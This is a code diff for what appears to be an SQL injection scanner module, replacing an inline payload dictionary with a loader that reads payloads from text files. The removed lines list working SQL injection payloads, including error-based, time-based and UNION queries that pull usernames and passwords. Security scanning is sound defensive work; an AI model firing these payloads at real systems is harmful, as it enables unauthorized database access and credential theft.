@@ -1,63 +1,38 @@
 import logging
 import time
-from urllib.parse import urlencode, urlparse, urlunparse, parse_qs
+from pathlib import Path
 
 import requests
 
 logger = logging.getLogger(__name__)
 
-# ---------------------------------------------------------------------------
-# SQL Injection payload library
-# ---------------------------------------------------------------------------
+# Load payloads from app/scanner/payloads/*.txt
+# Folder location: app/scanner/payloads/
 
-PAYLOADS: dict[str, list[str]] = {
-    "error_based": [
-        "'",
-        "''",
-        "`",
-        "\"",
-        "' OR '1'='1",
-        "' OR 1=1--",
-        "' OR 1=1#",
-        "1' ORDER BY 1--",
-        "1' ORDER BY 2--",
-        "1' ORDER BY 3--",
-        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
-        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x "
-        "FROM information_schema.tables GROUP BY x)a)--",
-        "1 AND EXP(~(SELECT * FROM (SELECT USER()) x))--",
-    ],
-    "boolean_based": [
-        "' AND '1'='1",
-        "' AND '1'='2",
-        "1 AND 1=1",
-        "1 AND 1=2",
-        "' AND 1=1--",
-        "' AND 1=2--",
-        "1' AND SUBSTRING(username,1,1)='a'--",
-        "1' AND SUBSTRING(username,1,1)='z'--",
-    ],
-    "time_based": [
-        "'; WAITFOR DELAY '0:0:5'--",                    # MSSQL
-        "' OR SLEEP(5)--",                               # MySQL
-        "'; SELECT pg_sleep(5)--",                       # PostgreSQL
-        "' AND SLEEP(5) AND '1'='1",
-        "1; WAITFOR DELAY '0:0:5'--",
-        "1 OR SLEEP(5)",
-        "' OR pg_sleep(5)--",
-        "') OR SLEEP(5)--",
-    ],
-    "union_based": [
-        "' UNION SELECT NULL--",
-        "' UNION SELECT NULL,NULL--",
-        "' UNION SELECT NULL,NULL,NULL--",
-        "' UNION SELECT 1,2,3--",
-        "' UNION ALL SELECT NULL,NULL--",
-        "' UNION SELECT @@version,NULL--",
-        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
-        "' UNION SELECT username,password FROM users--",
-    ],
-}
+PAYLOADS_DIR = Path(__file__).parent / "payloads"
+ 
+ATTACK_TYPES = ["error_based", "boolean_based", "time_based", "union_based"]
+ 
+ 
+def _load_payloads() -> dict[str, list[str]]:
+    """
+    Read each .txt file in the payloads/ folder.
+    Each line in the file is one payload. Blank lines are ignored.
+    """
+    payloads: dict[str, list[str]] = {}
+    for attack_type in ATTACK_TYPES:
+        filepath = PAYLOADS_DIR / f"{attack_type}.txt"
+        if not filepath.exists():
+            logger.warning("Payload file not found: %s", filepath)
+            payloads[attack_type] = []
+            continue
+        lines = filepath.read_text(encoding="utf-8").splitlines()
+        payloads[attack_type] = [line.strip() for line in lines if line.strip()]
+        logger.debug("Loaded %s payloads from %s", len(payloads[attack_type]), filepath.name)
+    return payloads
+ 
+ 
+PAYLOADS = _load_payloads()
 
 # Flat list with attack-type metadata attached
 ALL_PAYLOADS: list[dict] = [
